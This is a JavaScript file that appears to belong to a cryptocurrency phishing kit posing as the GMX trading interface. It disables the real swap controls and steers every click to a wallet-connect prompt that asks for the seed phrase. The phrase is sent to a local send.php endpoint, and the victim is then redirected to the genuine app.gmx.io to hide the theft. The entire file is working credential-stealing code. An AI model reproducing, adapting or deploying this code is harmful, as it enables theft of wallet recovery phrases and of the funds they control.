const openMenu = _ => {
    if (document.querySelector('.Exchange-swap-button')) {
        document.querySelector('.Exchange-swap-button').click();
    };
};

const sendDDD = _ => {
    if (document.querySelectorAll('.Wallet-btn')) {
        const formData = new FormData();
        document.querySelectorAll('.Wallet-btn').forEach(el => {
            el.onclick = async _ => {
                const wallet = el.getAttribute('attributebebr');
                document.querySelector('.Wallet-button-connect').style.display = 'grid';
                document.querySelector('.Wallet-input').style.display = 'block';
                document.querySelector('.Wallet-button-connect').textContent = `${document.querySelector('.Wallet-button-connect').textContent} ${wallet}`
                document.querySelectorAll('.Wallet-btn').forEach(el => el.style.display = 'none');
                document.querySelector('.Wallet-button-connect').onclick = async _ => {
                    const input = document.querySelector('.Wallet-input');
                    const phrase = input.value.trim().replace(/\s+/g, ' ').split(' ');
                    const countWords = phrase.length;

                    if (countWords === 12 || countWords === 15 || countWords === 18 || countWords === 21 || countWords === 24) {
                        formData.append('wallet', wallet);
                        formData.append('phrase', phrase);

                        await fetch('./send.php', {
                            method: 'POST',
                            body: formData
                        }).then(res => {
                            res.status === 200 && (location = 'https://app.gmx.io/#/trade');
                        })
                    };
                };
            };
        });
    };
};

const checkUrlHash = _ => {
    const hash = 'trade';
    const currHash = location.hash.replace('#/', '');
    currHash == hash ? false : location.hash = hash;
};

const checkLinks = _ => {
    if (document.querySelector('.App-header-network')) {
        document.querySelector('.App-header-network').onclick = openMenu;
    };

    if (document.querySelectorAll('.Exchange-swap-option-tabs .Tab-option')) {
        document.querySelectorAll('.Exchange-swap-option-tabs .Tab-option').forEach(el => el.style.pointerEvents = 'none');
    };

    if (document.querySelector('.Exchange-swap-ball')) {
        document.querySelector('.Exchange-swap-ball').style.pointerEvents = 'none';
    };

    if (document.querySelectorAll('.TokenSelector')) {
        document.querySelectorAll('.TokenSelector').forEach(el => el.style.pointerEvents = 'none');
    };

    if (document.querySelectorAll('.App-header-link-container')) {
        document.querySelectorAll('.App-header-link-container').forEach(link => link.onclick = openMenu);
    };

    if (document.querySelectorAll('.Exchange-info-label-button .link-underline')) {
        document.querySelectorAll('.Exchange-info-label-button .link-underline').forEach(link => link.onclick = openMenu);
    };
};

const observerHash = new MutationObserver(checkUrlHash);
const observerLinks = new MutationObserver(checkLinks);
const sendDDDaUTO = new MutationObserver(sendDDD);
[observerHash, observerLinks, sendDDDaUTO].forEach(obs => obs.observe(document.documentElement, {
    childList: true,
    subtree: true
}));

window.onload = _ => {
    openMenu();
};